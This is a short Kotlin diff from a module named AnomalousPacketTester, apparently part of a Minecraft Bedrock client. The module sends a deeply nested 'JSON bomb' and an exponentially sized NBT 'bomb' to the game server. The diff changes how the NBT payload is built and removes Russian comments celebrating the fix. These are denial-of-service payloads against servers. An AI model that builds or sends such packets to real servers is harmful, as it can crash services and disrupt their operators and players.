@@ -73,7 +73,6 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
             }
             responsePacket.setFormData(maliciousJson)
             
-            // <<< ПОБЕДА: Используем правильный метод serverBound из GameSession.kt
             session.serverBound(responsePacket)
             session.displayClientMessage("§e[AnomalousTester] Отправлена JSON-бомба (глубина: $jsonNestingDepth).")
         } catch (e: Exception) {
@@ -97,12 +96,13 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
                 currentLevel = nextLevel
             }
             
-            // <<< ПОБЕДА: Используем прямой конструктор NbtMap
-            val root = NbtMap(mapOf("bomb" to currentLevel))
+            // <<< ПОБЕДА: Используем публичный builder, как и положено
+            val root = NbtMap.builder()
+                .put("bomb", currentLevel)
+                .build()
 
             nbtPacket.setData(root)
             
-            // <<< ПОБЕДА: Используем правильный метод serverBound из GameSession.kt
             session.serverBound(nbtPacket)
             
             val totalElements = Math.pow(nbtBombWidth.toDouble(), nbtBombDepth.toDouble()).toLong()
